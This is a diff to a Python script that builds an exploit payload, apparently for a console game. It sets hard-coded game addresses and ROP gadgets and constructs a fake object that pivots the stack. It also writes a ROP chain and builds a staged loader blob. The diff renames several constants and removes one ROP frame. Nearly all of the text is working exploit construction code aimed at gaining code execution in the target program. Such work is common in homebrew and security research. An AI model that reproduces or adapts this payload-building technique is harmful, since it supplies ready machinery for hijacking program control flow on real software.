@@ -22,11 +22,10 @@ N_OWNER_ADDR = 0x166351C4
 
 # Game objects
 DEV = 0x00857CC8
-WF = 0x08D87378
+FIELD_NODE = 0x08D87378
 FIELD = 0x08A0B310
 BK = 0x08D87360
-RPG_T = 0x08D87380
-FIELD_REF_SLOT_ADDR = 0x008594AC
+FIELD_NODE_ENTITY = 0x08D87380
 
 # Functions and ROP gadgets for this game version.
 PIVOT = 0x0011E678  # Context load and stack pivot
@@ -65,7 +64,7 @@ ALLOC_CTX_OFF = 0x0D8
 VIEW_CTX_OFF = 0x118
 ROP_CHAIN_OFF = 0x158
 DEV_SLOT_OFF = 0x1C8
-WF_SLOT_OFF = 0x1CC
+FIELD_NODE_SLOT_OFF = 0x1CC
 RESTORE_TEMPLATE_OFF = 0x1D0
 EXIT_CTX_OFF = 0x204
 YOKAI_CTX_OFF = EXIT_CTX_OFF - 0x0C
@@ -101,7 +100,7 @@ def build_object(base):
     # Initial fake screen object / PIVOT context.
     p32(b, 0x00, base + 0x40)
     p32(b, 0x04, FIELD)
-    p32(b, 0x08, RPG_T)
+    p32(b, 0x08, FIELD_NODE_ENTITY)
     p32(b, 0x0C, 0)
     p32(b, 0x14, 1)
     p32(b, 0x34, base + INITIAL_STACK_OFF)
@@ -120,10 +119,9 @@ def build_object(base):
         p32(b, off + 0x14, pc)
 
     frame(INITIAL_STACK_OFF + 0x00, 0, 0, N_OWNER_ADDR + 4, 0, STR_R1_R2)  # owner + 0x04 = 0
-    frame(INITIAL_STACK_OFF + 0x18, 0, FIELD, FIELD_REF_SLOT_ADDR, RET_TRUE, STR_R1_R2)  # RET_TRUE also occupies fake-vtable slot base+0x84.
-    frame(INITIAL_STACK_OFF + 0x30, 0, base + VIEW_CTX_OFF, SCRATCH_ADDR + 4, 0, STR_R1_R2)  # [SCRATCH_ADDR+4] = base+VIEW_CTX_OFF
-    frame(INITIAL_STACK_OFF + 0x48, 0, PIVOT, SCRATCH_ADDR + 0xC, 0, STR_R1_R2)  # [SCRATCH_ADDR+0xC] = PIVOT
-    frame(INITIAL_STACK_OFF + 0x60, base + YOKAI_CTX_OFF, 0, 0, 0, PIVOT)  # call CREATE_YOKAI_FUNC, then ALLOC_CTX_OFF
+    frame(INITIAL_STACK_OFF + 0x18, 0, base + VIEW_CTX_OFF, SCRATCH_ADDR + 4, RET_TRUE, STR_R1_R2)  # [SCRATCH_ADDR+4] = base+VIEW_CTX_OFF; RET_TRUE at base+0x84.
+    frame(INITIAL_STACK_OFF + 0x30, 0, PIVOT, SCRATCH_ADDR + 0xC, 0, STR_R1_R2)  # [SCRATCH_ADDR+0xC] = PIVOT
+    frame(INITIAL_STACK_OFF + 0x48, base + YOKAI_CTX_OFF, 0, 0, 0, PIVOT)  # call CREATE_YOKAI_FUNC, then ALLOC_CTX_OFF
 
     # Allocation context.
     p32(b, ALLOC_CTX_OFF + 0x00, base + DEV_SLOT_OFF)  # r0 = pointer to word containing DEV
@@ -140,7 +138,7 @@ def build_object(base):
 
     # View-pop context. The same memory backs view+0x40/+0x48:
     #   view = base+ALLOC_CTX_OFF, view+0x40 = base+VIEW_CTX_OFF+0, view+0x48 = base+VIEW_CTX_OFF+8.
-    p32(b, VIEW_CTX_OFF + 0x00, base + WF_SLOT_OFF)  # entries pointer
+    p32(b, VIEW_CTX_OFF + 0x00, base + FIELD_NODE_SLOT_OFF)  # entries pointer
     p32(b, VIEW_CTX_OFF + 0x04, 0)
     p32(b, VIEW_CTX_OFF + 0x08, 0x00010001)  # entry count = 1
     for off in range(0x0C, 0x34, 4):
@@ -184,7 +182,7 @@ def build_object(base):
         p32(b, ROP_CHAIN_OFF + 4 * i, word)
 
     p32(b, DEV_SLOT_OFF, DEV)
-    p32(b, WF_SLOT_OFF, WF)
+    p32(b, FIELD_NODE_SLOT_OFF, FIELD_NODE)
     for i, word in enumerate(MATERIAL):
         p32(b, RESTORE_TEMPLATE_OFF + 4 * i, word)
 
@@ -216,7 +214,7 @@ def build_stage1(blob, stage2_size):
     b = bytearray(STAGE1_BLOB_OFF)
     p32(b, 0x00, P + 0x40)
     p32(b, 0x04, FIELD)
-    p32(b, 0x08, RPG_T)
+    p32(b, 0x08, FIELD_NODE_ENTITY)
     p32(b, 0x0C, P + STAGE1_CTX_OFF)
     p32(b, 0x14, 1)
     p32(b, 0x34, SCRATCH_ADDR + 0x1C)
